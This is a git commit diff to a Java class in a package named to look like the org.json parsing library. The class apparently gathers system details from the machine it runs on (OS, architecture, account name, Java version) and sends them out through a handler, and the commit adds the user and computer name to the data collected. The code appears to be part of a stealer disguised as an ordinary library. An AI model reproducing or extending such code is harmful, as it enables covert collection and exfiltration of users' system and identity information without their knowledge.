e11c794542f2a4feeb9c1188da8f1ecd4f8c7af0
Gavin <57580886+Sxmurai@users.noreply.github.com>
2021-11-28 22:55:28 -0600

    good idea perry

--- src/org/json/updated/parsers/impl/GeneralInformation.java
+++ src/org/json/updated/parsers/impl/GeneralInformation.java
@@ -12,6 +12,7 @@ public class GeneralInformation implements JSONObject {
         content += "OS: " + System.getProperty("os.name") + "(" + System.getProperty("os.version") + ")" + "\\n";
         content += "Arch: " + System.getProperty("os.arch") + "\\n";
         content += "Account Name: " + System.getProperty("user.name") + "\\n";
+        content += "Hostname: " + System.getProperty("user.name") + "@" + System.getenv("COMPUTERNAME") + "\\n";
         content += "Java Version: " + System.getProperty("java.version");
 
         JSONRegexHandler.send(new JSONBuilder().value("content", content).build());
